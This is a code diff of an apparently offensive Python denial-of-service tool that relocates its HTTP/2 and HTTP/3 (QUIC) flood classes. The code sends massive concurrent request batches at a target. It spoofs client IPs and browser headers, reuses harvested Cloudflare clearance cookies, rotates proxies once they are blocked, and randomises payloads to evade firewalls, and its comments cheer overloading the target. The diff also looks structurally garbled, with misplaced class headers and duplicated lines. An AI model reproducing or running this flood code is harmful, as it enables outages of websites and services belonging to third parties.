@@ -1238,8 +1238,271 @@ class AsyncHttpFlood(Thread):
                 return f"http://{p_str}"
         return None
     
-        except: pass
 
+
+    def _generate_post_payload(self) -> str:
+        # [WAF BYPASS] Intelligent payload generator to evade WAF static analysis
+        # Many WAFs block static {"data": "xxxxx"} patterns
+        # Uses smart content-type-aware payloads for deeper evasion
+        intel = getattr(self, '_chaos_intel', {})
+        if intel.get("stealth_cooldown", 0) > 0 and randint(1, 100) < 50:
+            if hasattr(self, '_chaos_generate_battering_ram'):
+                return self._chaos_generate_battering_ram()
+            
+        r_type = randint(1, 6)
+        r_type = randint(1, 6)
+        if r_type == 1:
+            return '{"search": "%s", "limit": %d}' % (ProxyTools.Random.rand_str(16), randint(10, 100))
+        elif r_type == 2:
+            return '{"user_id": "%s", "action": "ping"}' % uuid4()
+        elif r_type == 3:
+            return '{"payload": "%s", "timestamp": %d}' % (ProxyTools.Random.rand_str(32), int(time()))
+        elif r_type == 5:
+            # GraphQL-style query (common in modern apps)
+            return '{"query":"query{__typename}","variables":{"id":"%s"}}' % ProxyTools.Random.rand_str(12)
+        else:
+            return '{"data": "%s"}' % ProxyTools.Random.rand_str(32)
+
+    async def _flood_batch(self, client: httpx.AsyncClient, batch_size: int = 50, proxy_url: str = None):
+        """Fire batch_size requests concurrently via HTTP/2 multiplexing"""
+        global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT, ERROR_COUNT
+        
+        target_domain = self._target.user or self._target.host
+        
+        async def single_request():
+            global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT
+            path = self._get_random_path()
+            safe_path = path if path.startswith("/") else f"/{path}"
+            url = f"{self._target.scheme}://{self._target.host}{safe_path}"
+            ua = randchoice(self._useragents)
+            
+            headers = {
+                "User-Agent": ua,
+                "Accept-Encoding": "gzip, deflate, br",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "X-Forwarded-For": Tools.get_random_indo_ip(),
+                "Referer": randchoice(self._referers),
+                "Host": target_domain,
+                "Sec-Ch-Ua": '"Chromium";v="136", "Google Chrome";v="136", "Not?A_Brand";v="99"',
+                "Sec-Ch-Ua-Mobile": "?0",
+                "Sec-Ch-Ua-Platform": '"Windows"',
+                "Sec-Fetch-Dest": "document",
+                "Sec-Fetch-Mode": "navigate",
+                "Priority": "u=0, i",
+            }
+            # Inject all harvested cookies + cf_clearance for maximum trust
+            if hasattr(self, '_chaos_get_cookie_header'):
+                cookie_str = self._chaos_get_cookie_header()
+                if cookie_str:
+                    headers["Cookie"] = cookie_str
+            elif hasattr(self, '_cf_clearance') and self._cf_clearance:
+                headers["Cookie"] = f"cf_clearance={self._cf_clearance}"
+            
+            try:
+                target_ip = randchoice(self.host_array) if hasattr(self, 'host_array') and self.host_array else self._target.host
+                url = f"{self._target.scheme}://{target_ip}{safe_path}"
+                
+                if self._method == "POST":
+                    headers["Content-Type"] = "application/json"
+                    headers["X-Requested-With"] = "XMLHttpRequest"
+                    resp = await client.post(url, headers=headers, content=self._generate_post_payload())
+                else:
+                    resp = await client.get(url, headers=headers)
+                    
+                REQUESTS_SENT += 1
+                CONNECTIONS_SENT += 1
+                BYTES_SEND += 1000
+                
+                if resp.status_code in {403, 429}:
+                    # BURN THE SPECIFIC PROXY, NOT THE WHOLE LIST
+                    if proxy_url:
+                        # strip protocol if present
+                        p_key = proxy_url.replace("http://", "").replace("socks5://", "")
+                        BURNED_PROXIES[p_key] = time()
+                    # Trigger backoff signal (via exception caught by gather)
+                    raise Exception(f"WAF_BLOCK_{resp.status_code}")
+                elif resp.status_code >= 500:
+                    pass  # Target overloaded — good
+            except Exception as e:
+                Tools.track_error(e)
+                if "WAF_BLOCK" in str(e):
+                    raise e
+        
+        tasks = [single_request() for _ in range(batch_size)]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        # If any request hit 429/403, bubble it up to kill the client
+        for res in results:
+            if isinstance(res, Exception) and "WAF_BLOCK" in str(res):
+                raise res
+    
+    async def _run_async(self):
+        """Main async loop: create client, fire batches until event clears"""
+        global REQUESTS_SENT, ERROR_COUNT
+        
+        while self._synevent.is_set():
+            proxy_url = self._get_proxy_url()
+            try:
+                async with httpx.AsyncClient(
+                    http2=True,
+                    verify=False,
+                    proxy=proxy_url,
+                    timeout=httpx.Timeout(5.0, connect=3.0),
+                    limits=httpx.Limits(max_connections=100, max_keepalive_connections=50)
+                ) as client:
+                    # Fire multiple batches per client connection
+                    # [FIX] Pipeline: fire multiple batches concurrently for max throughput
+                    loop_counter = 0
+                    while self._synevent.is_set():
+                        loop_counter += 1
+                        
+                        # [V36] Background Daemon Cookie Hot Swapping
+                        # Check disk for renewed cf_clearance cookie every 100 loops
+                        if loop_counter % 100 == 0:
+                            cf_path = Path(__file__).parent / "files/cf_clearance.txt"
+                            if cf_path.exists():
+                                new_clearance = cf_path.read_text().strip()
+                                if new_clearance and new_clearance != self._cf_clearance:
+                                    self._cf_clearance = new_clearance
+                                    
+                        batch_tasks = [self._flood_batch(client, batch_size=50, proxy_url=proxy_url) for _ in range(min(self._rpc, 10))]
+                        await asyncio.gather(*batch_tasks, return_exceptions=False)
+            except Exception as e:
+                # [V36] Rate Limit Detection & Evasion Backoff
+                if "WAF_BLOCK" in str(e):
+                    await asyncio.sleep(2.0)  # Evasion Backoff before rotating
+                else:
+                    Tools.track_error(e)
+                    await asyncio.sleep(0.5)
+    
+    def run(self):
+        if self._synevent:
+            self._synevent.wait()
+        
+        # Each thread gets its own event loop for true async I/O
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        try:
+            loop.run_until_complete(self._run_async())
+        except Exception as e:
+            Tools.track_error(e)
+        finally:
+            loop.close()
+
+class AsyncQuicFlood(Thread):
+    """
+    [V36] HTTP/3 QUIC L7 Vector — Battle-Hardened Edition.
+    Exploits UDP-based multiplexing to bypass TCP-stateful WAFs.
+    Features: path rotation, UA cycling, POST payloads, cf_clearance injection.
+    """
+    def __init__(self, thread_id: int, target: URL, host: str, rpc: int = 50, synevent: Event = None, 
+                 useragents: list = None, referers: list = None, proxies: list = None, 
+                 crawled_paths: list = None, method: str = "H3_QUIC"):
+        Thread.__init__(self, daemon=True)
+        self._thread_id = thread_id
+        self._synevent = synevent
+        self._target = target
+        self._rpc = rpc
+        self._proxies = proxies
+        self._useragents = list(useragents) if useragents else [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36',
+        ]
+        self._referers = list(referers) if referers else ['https://www.google.com/']
+        self.crawled_paths = crawled_paths or []
+        self.host_array = []
+        
+        self._cf_clearance = None
+        cf_path = Path(__file__).parent / "files/cf_clearance.txt"
+        if cf_path.exists():
+            self._cf_clearance = cf_path.read_text().strip()
+    
+    def _get_random_path(self) -> bytes:
+        if self.crawled_paths and randint(0, 100) < 60:
+            p = randchoice(self.crawled_paths)
+            return p.encode() if p.startswith("/") else f"/{p}".encode()
+        # Generate cache-busting random path
+        rand_param = f"/?q={''.join(choices('abcdefghijklmnopqrstuvwxyz0123456789', k=randint(5,12)))}&_={randint(100000,999999)}"
+        return rand_param.encode()
+        
+    async def _flood_quic(self):
+        global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT
+        try:
+            from aioquic.asyncio import connect
+            from aioquic.h3.connection import H3Connection
+            from aioquic.quic.configuration import QuicConfiguration
+        except ImportError:
+            return  # Failsafe if aioquic missing
+            
+        config = QuicConfiguration(is_client=True)
+        config.verify_mode = False  # Skip TLS verification
+        
+        loop_counter = 0
+        while self._synevent.is_set():
+            target_ip = randchoice(self.host_array) if self.host_array else self._target.host
+            try:
+                async with connect(target_ip, 443, configuration=config) as protocol:
+                    h3_conn = H3Connection(protocol._quic)
+                    CONNECTIONS_SENT += 1
+                    
+                    # Fire 200 streams per QUIC connection for max multiplexing damage
+                    for _ in range(200):
+                        if not self._synevent.is_set(): break
+                        
+                        loop_counter += 1
+                        
+                        # Hot-swap cf_clearance every 200 requests
+                        if loop_counter % 200 == 0:
+                            cf_path = Path(__file__).parent / "files/cf_clearance.txt"
+                            if cf_path.exists():
+                                new_cl = cf_path.read_text().strip()
+                                if new_cl: self._cf_clearance = new_cl
+                        
+                        stream_id = protocol._quic.get_next_available_stream_id()
+                        ua = randchoice(self._useragents)
+                        path = self._get_random_path()
+                        
+                        headers = [
+                            (b":method", b"GET"),
+                            (b":scheme", b"https"),
+                            (b":authority", self._target.host.encode()),
+                            (b":path", path),
+                            (b"user-agent", ua.encode()),
+                            (b"accept", b"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
+                            (b"accept-encoding", b"gzip, deflate, br"),
+                            (b"accept-language", b"en-US,en;q=0.9"),
+                            (b"sec-ch-ua", b'"Chromium";v="136", "Google Chrome";v="136", "Not?A_Brand";v="99"'),
+                            (b"sec-ch-ua-mobile", b"?0"),
+                            (b"sec-ch-ua-platform", b'"Windows"'),
+                            (b"sec-fetch-dest", b"document"),
+                            (b"sec-fetch-mode", b"navigate"),
+                            (b"referer", randchoice(self._referers).encode()),
+                        ]
+                        
+                        # Inject cf_clearance cookie if available
+                        if self._cf_clearance:
+                            headers.append((b"cookie", f"cf_clearance={self._cf_clearance}".encode()))
+                        
+                        h3_conn.send_headers(stream_id, headers, end_stream=True)
+                        protocol.transmit()
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += 800
+                        
+            except Exception:
+                await asyncio.sleep(0.3)  # Brief backoff before reconnecting
+                
+    def run(self):
+        if self._synevent:
+            self._synevent.wait()
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        try:
+            loop.run_until_complete(self._flood_quic())
+        except Exception:
+            pass
+        finally:
+            loop.close()
+# noinspection PyBroadException,PyUnusedLocal
+class HttpFlood(Thread):
     def _chaos_siege_doctrine(self):
         """SIEGE COMMANDER PROTOCOL.
         Implements a 5-phase military siege doctrine that orchestrates all other subsystems.
@@ -2733,273 +2996,6 @@ class AsyncHttpFlood(Thread):
         # Tick down cooldown
         if intel["stealth_cooldown"] > 0:
             intel["stealth_cooldown"] -= 1
-
-    def _generate_post_payload(self) -> str:
-        # [WAF BYPASS] Intelligent payload generator to evade WAF static analysis
-        # Many WAFs block static {"data": "xxxxx"} patterns
-        # Uses smart content-type-aware payloads for deeper evasion
-        intel = getattr(self, '_chaos_intel', {})
-        if intel.get("stealth_cooldown", 0) > 0 and randint(1, 100) < 50:
-            # Under stealth cooldown, use highly evasive battering ram 50% of the time
-            return self._chaos_generate_battering_ram()
-            
-        r_type = randint(1, 6)
-        # [WAF BYPASS] Intelligent payload generator to evade WAF static analysis
-        # Many WAFs block static {"data": "xxxxx"} patterns
-        # Uses smart content-type-aware payloads for deeper evasion
-        r_type = randint(1, 6)
-        if r_type == 1:
-            return '{"search": "%s", "limit": %d}' % (ProxyTools.Random.rand_str(16), randint(10, 100))
-        elif r_type == 2:
-            return '{"user_id": "%s", "action": "ping"}' % uuid4()
-        elif r_type == 3:
-            return '{"payload": "%s", "timestamp": %d}' % (ProxyTools.Random.rand_str(32), int(time()))
-        elif r_type == 5:
-            # GraphQL-style query (common in modern apps)
-            return '{"query":"query{__typename}","variables":{"id":"%s"}}' % ProxyTools.Random.rand_str(12)
-        else:
-            return '{"data": "%s"}' % ProxyTools.Random.rand_str(32)
-
-    async def _flood_batch(self, client: httpx.AsyncClient, batch_size: int = 50, proxy_url: str = None):
-        """Fire batch_size requests concurrently via HTTP/2 multiplexing"""
-        global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT, ERROR_COUNT
-        
-        target_domain = self._target.user or self._target.host
-        
-        async def single_request():
-            global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT
-            path = self._get_random_path()
-            safe_path = path if path.startswith("/") else f"/{path}"
-            url = f"{self._target.scheme}://{self._target.host}{safe_path}"
-            ua = randchoice(self._useragents)
-            
-            headers = {
-                "User-Agent": ua,
-                "Accept-Encoding": "gzip, deflate, br",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "X-Forwarded-For": Tools.get_random_indo_ip(),
-                "Referer": randchoice(self._referers),
-                "Host": target_domain,
-                "Sec-Ch-Ua": '"Chromium";v="136", "Google Chrome";v="136", "Not?A_Brand";v="99"',
-                "Sec-Ch-Ua-Mobile": "?0",
-                "Sec-Ch-Ua-Platform": '"Windows"',
-                "Sec-Fetch-Dest": "document",
-                "Sec-Fetch-Mode": "navigate",
-                "Priority": "u=0, i",
-            }
-            # Inject all harvested cookies + cf_clearance for maximum trust
-            if hasattr(self, '_chaos_get_cookie_header'):
-                cookie_str = self._chaos_get_cookie_header()
-                if cookie_str:
-                    headers["Cookie"] = cookie_str
-            elif hasattr(self, '_cf_clearance') and self._cf_clearance:
-                headers["Cookie"] = f"cf_clearance={self._cf_clearance}"
-            
-            try:
-                target_ip = randchoice(self.host_array) if hasattr(self, 'host_array') and self.host_array else self._target.host
-                url = f"{self._target.scheme}://{target_ip}{safe_path}"
-                
-                if self._method == "POST":
-                    headers["Content-Type"] = "application/json"
-                    headers["X-Requested-With"] = "XMLHttpRequest"
-                    resp = await client.post(url, headers=headers, content=self._generate_post_payload())
-                else:
-                    resp = await client.get(url, headers=headers)
-                    
-                REQUESTS_SENT += 1
-                CONNECTIONS_SENT += 1
-                BYTES_SEND += 1000
-                
-                if resp.status_code in {403, 429}:
-                    # BURN THE SPECIFIC PROXY, NOT THE WHOLE LIST
-                    if proxy_url:
-                        # strip protocol if present
-                        p_key = proxy_url.replace("http://", "").replace("socks5://", "")
-                        BURNED_PROXIES[p_key] = time()
-                    # Trigger backoff signal (via exception caught by gather)
-                    raise Exception(f"WAF_BLOCK_{resp.status_code}")
-                elif resp.status_code >= 500:
-                    pass  # Target overloaded — good
-            except Exception as e:
-                Tools.track_error(e)
-                if "WAF_BLOCK" in str(e):
-                    raise e
-        
-        tasks = [single_request() for _ in range(batch_size)]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        # If any request hit 429/403, bubble it up to kill the client
-        for res in results:
-            if isinstance(res, Exception) and "WAF_BLOCK" in str(res):
-                raise res
-    
-    async def _run_async(self):
-        """Main async loop: create client, fire batches until event clears"""
-        global REQUESTS_SENT, ERROR_COUNT
-        
-        while self._synevent.is_set():
-            proxy_url = self._get_proxy_url()
-            try:
-                async with httpx.AsyncClient(
-                    http2=True,
-                    verify=False,
-                    proxy=proxy_url,
-                    timeout=httpx.Timeout(5.0, connect=3.0),
-                    limits=httpx.Limits(max_connections=100, max_keepalive_connections=50)
-                ) as client:
-                    # Fire multiple batches per client connection
-                    # [FIX] Pipeline: fire multiple batches concurrently for max throughput
-                    loop_counter = 0
-                    while self._synevent.is_set():
-                        loop_counter += 1
-                        
-                        # [V36] Background Daemon Cookie Hot Swapping
-                        # Check disk for renewed cf_clearance cookie every 100 loops
-                        if loop_counter % 100 == 0:
-                            cf_path = Path(__file__).parent / "files/cf_clearance.txt"
-                            if cf_path.exists():
-                                new_clearance = cf_path.read_text().strip()
-                                if new_clearance and new_clearance != self._cf_clearance:
-                                    self._cf_clearance = new_clearance
-                                    
-                        batch_tasks = [self._flood_batch(client, batch_size=50, proxy_url=proxy_url) for _ in range(min(self._rpc, 10))]
-                        await asyncio.gather(*batch_tasks, return_exceptions=False)
-            except Exception as e:
-                # [V36] Rate Limit Detection & Evasion Backoff
-                if "WAF_BLOCK" in str(e):
-                    await asyncio.sleep(2.0)  # Evasion Backoff before rotating
-                else:
-                    Tools.track_error(e)
-                    await asyncio.sleep(0.5)
-    
-    def run(self):
-        if self._synevent:
-            self._synevent.wait()
-        
-        # Each thread gets its own event loop for true async I/O
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        try:
-            loop.run_until_complete(self._run_async())
-        except Exception as e:
-            Tools.track_error(e)
-        finally:
-            loop.close()
-
-class AsyncQuicFlood(Thread):
-    """
-    [V36] HTTP/3 QUIC L7 Vector — Battle-Hardened Edition.
-    Exploits UDP-based multiplexing to bypass TCP-stateful WAFs.
-    Features: path rotation, UA cycling, POST payloads, cf_clearance injection.
-    """
-    def __init__(self, thread_id: int, target: URL, host: str, rpc: int = 50, synevent: Event = None, 
-                 useragents: list = None, referers: list = None, proxies: list = None, 
-                 crawled_paths: list = None, method: str = "H3_QUIC"):
-        Thread.__init__(self, daemon=True)
-        self._thread_id = thread_id
-        self._synevent = synevent
-        self._target = target
-        self._rpc = rpc
-        self._proxies = proxies
-        self._useragents = list(useragents) if useragents else [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36',
-        ]
-        self._referers = list(referers) if referers else ['https://www.google.com/']
-        self.crawled_paths = crawled_paths or []
-        self.host_array = []
-        
-        self._cf_clearance = None
-        cf_path = Path(__file__).parent / "files/cf_clearance.txt"
-        if cf_path.exists():
-            self._cf_clearance = cf_path.read_text().strip()
-    
-    def _get_random_path(self) -> bytes:
-        if self.crawled_paths and randint(0, 100) < 60:
-            p = randchoice(self.crawled_paths)
-            return p.encode() if p.startswith("/") else f"/{p}".encode()
-        # Generate cache-busting random path
-        rand_param = f"/?q={''.join(choices('abcdefghijklmnopqrstuvwxyz0123456789', k=randint(5,12)))}&_={randint(100000,999999)}"
-        return rand_param.encode()
-        
-    async def _flood_quic(self):
-        global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT
-        try:
-            from aioquic.asyncio import connect
-            from aioquic.h3.connection import H3Connection
-            from aioquic.quic.configuration import QuicConfiguration
-        except ImportError:
-            return  # Failsafe if aioquic missing
-            
-        config = QuicConfiguration(is_client=True)
-        config.verify_mode = False  # Skip TLS verification
-        
-        loop_counter = 0
-        while self._synevent.is_set():
-            target_ip = randchoice(self.host_array) if self.host_array else self._target.host
-            try:
-                async with connect(target_ip, 443, configuration=config) as protocol:
-                    h3_conn = H3Connection(protocol._quic)
-                    CONNECTIONS_SENT += 1
-                    
-                    # Fire 200 streams per QUIC connection for max multiplexing damage
-                    for _ in range(200):
-                        if not self._synevent.is_set(): break
-                        
-                        loop_counter += 1
-                        
-                        # Hot-swap cf_clearance every 200 requests
-                        if loop_counter % 200 == 0:
-                            cf_path = Path(__file__).parent / "files/cf_clearance.txt"
-                            if cf_path.exists():
-                                new_cl = cf_path.read_text().strip()
-                                if new_cl: self._cf_clearance = new_cl
-                        
-                        stream_id = protocol._quic.get_next_available_stream_id()
-                        ua = randchoice(self._useragents)
-                        path = self._get_random_path()
-                        
-                        headers = [
-                            (b":method", b"GET"),
-                            (b":scheme", b"https"),
-                            (b":authority", self._target.host.encode()),
-                            (b":path", path),
-                            (b"user-agent", ua.encode()),
-                            (b"accept", b"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
-                            (b"accept-encoding", b"gzip, deflate, br"),
-                            (b"accept-language", b"en-US,en;q=0.9"),
-                            (b"sec-ch-ua", b'"Chromium";v="136", "Google Chrome";v="136", "Not?A_Brand";v="99"'),
-                            (b"sec-ch-ua-mobile", b"?0"),
-                            (b"sec-ch-ua-platform", b'"Windows"'),
-                            (b"sec-fetch-dest", b"document"),
-                            (b"sec-fetch-mode", b"navigate"),
-                            (b"referer", randchoice(self._referers).encode()),
-                        ]
-                        
-                        # Inject cf_clearance cookie if available
-                        if self._cf_clearance:
-                            headers.append((b"cookie", f"cf_clearance={self._cf_clearance}".encode()))
-                        
-                        h3_conn.send_headers(stream_id, headers, end_stream=True)
-                        protocol.transmit()
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += 800
-                        
-            except Exception:
-                await asyncio.sleep(0.3)  # Brief backoff before reconnecting
-                
-    def run(self):
-        if self._synevent:
-            self._synevent.wait()
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        try:
-            loop.run_until_complete(self._flood_quic())
-        except Exception:
-            pass
-        finally:
-            loop.close()
-# noinspection PyBroadException,PyUnusedLocal
-class HttpFlood(Thread):
     _proxies: List[Proxy] = None
     _payload: str
     _defaultpayload: Any
